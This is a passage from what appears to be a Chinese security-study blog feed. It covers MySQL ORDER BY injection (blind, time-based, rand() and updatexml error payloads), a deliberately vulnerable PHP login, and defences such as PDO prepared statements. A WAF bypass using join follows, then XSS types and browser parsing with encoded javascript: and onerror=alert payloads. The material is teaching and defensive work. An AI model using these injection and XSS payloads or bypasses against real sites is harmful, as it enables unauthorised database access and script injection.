class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">asc</span>;  #升序(默认升序)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">desc</span>;  #降序</span><br></pre></td></tr></table></figure>\n<p>这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:</p>\n<p>因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id;</span><br><span class=\"line\">selecr <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>基于 if 盲注：</p>\n<p>需要知道列名</p>\n<p>order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>\n<p>这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,id,username);</span><br><span class=\"line\">order by if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure>\n<p>如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面</p>\n<p>基于时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,1,sleep(1))</span><br></pre></td></tr></table></figure>\n<p>基于 rand () 盲</p>\n<p>可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(ascii(mid((select database()),1,1))&gt;96)</span><br></pre></td></tr></table></figure>\n<p>基于报错注入：</p>\n<p>updatexml 和 extravalue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常</span><br><span class=\"line\">select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错</span><br></pre></td></tr></table></figure>\n<p>order by 注入的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &#x27;select * from admin where username=&#x27;&quot;.$username.&quot;&#x27;&#x27;;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$row = mysql_fetch_array($result);</span><br><span class=\"line\">if(isset($row)&amp;&amp;row[&#x27;username&#x27;]!=&quot;admin&quot;)&#123;</span><br><span class=\"line\">\t$hit=&quot;username error!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tif ($row[&#x27;password&#x27;] === $password)&#123;</span><br><span class=\"line\">\t\t$hit=&quot;&quot;;</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t$hit=&quot;password error!&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">             </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=admin&#x27; union 1,2,&#x27;字符串&#x27; order by 3</span><br></pre></td></tr></table></figure>\n<p>或者一般存在的注入点为：可控制的位置在 <code>order by</code>  子句后，如下 order 参数可控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from goods order by $_GET[&#x27;order&#x27;]&quot;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=\">Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=\">sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入</span></p>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>预处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s\">PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        },
        {
            "id": "http://example.com/2022/02/17/XSS/",
            "url": "http://example.com/2022/02/17/XSS/",
            "title": "XSS",
            "date_published": "2022-02-17T05:38:45.000Z",
            "content_html": "<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<h2 id=\"session-cookie\"><a class=\"markdownIt-Anchor\" href=\"#session-cookie\">#</a> session || cookie</h2>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xMzMzMzMzNjY3Ny9hcnRpY2xlL2RldGFpbHMvMTAwOTM5MDMw\">(62 条消息) Cookie 和 Session 的区别（面试必备）_秋风不识路的博客 - CSDN 博客_cookie 与 session 区别</span></p>\n<h2 id=\"1反射型xss\"><a class=\"markdownIt-Anchor\" href=\"#1反射型xss\">#</a> 1. 反射型 xss</h2>\n<p>反射型 XSS 是非持久性、参数型的跨站脚本。反射型 XSS 的 JS 代码在 Web 应用的参数（变量）中，如搜 索框的反射型 XSS。在搜索框中，提交 PoC [scriptalert (/xss/)/script]，点击搜索，即可触发反射型 XSS。 注意到，我们提交的 poc 会出现在 search.php 页面的 keywords 参数中。</p>\n<h2 id=\"2存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#2存储型xss\">#</a> 2. 存储型 XSS</h2>\n<p>存储型 XSS 是持久性跨站脚本。持久性体现在 XSS 代码不是在某个参数（变量）中，而是写进数据库或 文件等可以永久保存数据的介质中。存储型 XSS 通常发生在留言板等地方。我们在留言板位置留言，将 恶意代码写进数据库中。此时，我们只完成了第一步，将恶意代码写入数据库。因为 XSS 使用的 JS 代 码，JS 代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的 XSS 代码，才能真正触发 XSS。 此时，需要我们模拟网站后台管理员的身份，查看留言。</p>\n<h2 id=\"3基于dom的\"><a class=\"markdownIt-Anchor\" href=\"#3基于dom的\">#</a> 3. 基于 DOM 的</h2>\n<p>XSS DOM XSS 比较特殊。owasp 关于 DOM 型号 XSS 的定义是基于 DOM 的 XSS 是一种 XSS 攻击，其中攻击 的 payload 由于修改受害者浏览器页面的 DOM 树而执行的。其特殊的地方就是 payload 在浏览器本地修 改 DOM 树而执行， 并不会传到服务器上，这也就使得 DOM XSS 比较难以检测。</p>\n<p>URL 的每一个参数、URL 本身、表单、搜索框、常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等</p>\n<h2 id=\"浏览器解析机制\"><a class=\"markdownIt-Anchor\" href=\"#浏览器解析机制\">#</a> 浏览器解析机制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.&lt;a href=<span class=\"string\">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;aaa&lt;/a&gt;</span><br><span class=\"line\"><span class=\"comment\">// 解析不了,href后的编码会使用实体编码解析，不能解析url编码</span></span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1:18888/javascript:alert%281%29</span></span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;javascript:alert(1)&quot;</span></span><br><span class=\"line\"><span class=\"number\">2</span>.&lt;a href=<span class=\"string\">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;</span>&gt;</span><br><span class=\"line\">HTML字符实体编码 <span class=\"string\">&quot;javascript&quot;</span> 和 URL 编码 <span class=\"string\">&quot;alert(2)&quot;</span></span><br><span class=\"line\">  JavaScript支持Unicode，hex，utf-<span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"number\">3</span>.&lt;a href=<span class=\"string\">&quot;javascript%3aalert(3)&quot;</span>&gt;&lt;/a&gt;</span><br><span class=\"line\">URL 编码 <span class=\"string\">&quot;:&quot;</span></span><br><span class=\"line\">  js不能编码符号</span><br><span class=\"line\"><span class=\"number\">4</span>.&lt;div&gt;&amp;<span class=\"comment\">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">  会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">5</span>.&lt;textarea&gt;&amp;<span class=\"comment\">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br><span class=\"line\">HTML字符实体编码 &lt; 和 &gt;</span><br><span class=\"line\">    会解析但不会执行</span><br><span class=\"line\"><span class=\"number\">6</span>.&lt;textarea&gt;&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">6</span>)&lt;/script&gt;&lt;/textarea&gt;</span><br><span class=\"line\">    会解析但不会执行</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;!-- 不能解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;aaa&lt;/a&gt;&lt;br&gt;   </span><br><span class=\"line\">    &lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</span><br><span class=\"line\">    &lt;!-- js中符号不能编码 --&gt;</span><br><span class=\"line\">    &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- html解析完不能执行，&lt;不能编码，浏览器中直接显示img标签 --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中的标签可以被解码，但不能被解析，&lt;script&gt;alert(5)&lt;/script&gt; --&gt;</span><br><span class=\"line\">    &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- textarea中所有标签都不能被解析 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;8\\u0027);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 不能编码符号 --&gt;</span><br><span class=\"line\">    &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 原始字符块只能容纳文本，会被解析为文本 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 不能对()及其里面的内容编码 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 同理 --&gt;</span><br><span class=\"line\">    &lt;script&gt;alert(&#x27;14\\u000a)&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- Unicode 编码换行符（0x0A）,但不会引起真正的换行 --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 可以解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;bbb&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 直接通过html解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;ccc&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 通过html解析为javascript，js在解析url编码 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 先html解析，编码，再给js解析 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 编码alert，函数名可以解析 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析</span><br><span class=\"line\">    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#x27;&lt;&#x27;符号&#x27;（后面没有跟&#x27;/&#x27;符号）&#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</span><br><span class=\"line\">    &lt;input value=&quot;xxx&quot;&gt;  由于没有&gt;,value中的内容无法进入数据状态解析</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class=\"line\">    &lt;textarea&gt;由于有完整的&lt;&gt;，因此可以解析后面的内容，把&amp;#60解析为&lt;,但不会进入数据开始状态</span><br><span class=\"line\">    不能对协议类型进行任何的编码操作&#x27;</span><br><span class=\"line\">    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>浏览器解析顺序：URL 解析器 -&gt;HTML 解析器 -&gt; CSS 解析器 -&gt;JS 解析器</p>\n<p>不能对协议进行编码 javascript:   (包含：)</p>\n<h3 id=\"html解析\"><a class=\"markdownIt-Anchor\" href=\"#html解析\">#</a> HTML 解析</h3>\n<p>一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;‘符号（后面没有跟’/' 符号）就会进入 <code>“标签开始状态(Tag open state)”</code> 。然后转变到 <code>“标签名状态(Tag name state)”</code> ， <code>“前属性名状态(before attribute name state)”</code> … 最后进入 <code>“数据状态(Data state)”</code>  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。</p>\n<p>在 HTML 中有五类元素：</p>\n<ol>\n<li>\n<p>空元素 (Void elements)，如<area>,<base>等等</p>\n</li>\n<li>\n<p>原始文本元素 (Raw text elements)，有<script>和<style></p>\n</li>\n<li>\n<p>RCDATA 元素 (RCDATA elements)，有<textarea>和<title></p>\n</li>\n<li>\n<p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>\n</li>\n<li>\n<p>基本元素 (Normal elements)，即除了以上 4 种元素以外的元素</p>\n</li>\n</ol>\n<p>五类元素的区别如下：</p>\n<ol>\n<li>\n<p>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>\n</li>\n<li>\n<p>原始文本元素，可以容纳文本。</p>\n</li>\n<li>\n<p>RCDATA 元素，可以容纳文本和字符引用。</p>\n</li>\n<li>\n<p>外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>\n</li>\n<li>\n<p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>\n</li>\n</ol>\n<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在<textarea>和<title>标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如<textarea>或<title>的内容中），唯一能够被解析器认做是标签的就是 “</textarea>” 或者 “</title>”。因此，在 “<textarea>” 和 “<title>” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>\n<h3 id=\"url解析\"><a class=\"markdownIt-Anchor\" href=\"#url解析\">#</a> URL 解析</h3>\n<p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>\n<h3 id=\"javascript解析\"><a class=\"markdownIt-Anchor\" href=\"#javascript解析\">#</a> JavaScript 解析</h3>\n<p>那像 “\\uXXXX”（例如 \\u0000,\\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \\uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。</p>\n<p>字符串中：当 Unicode 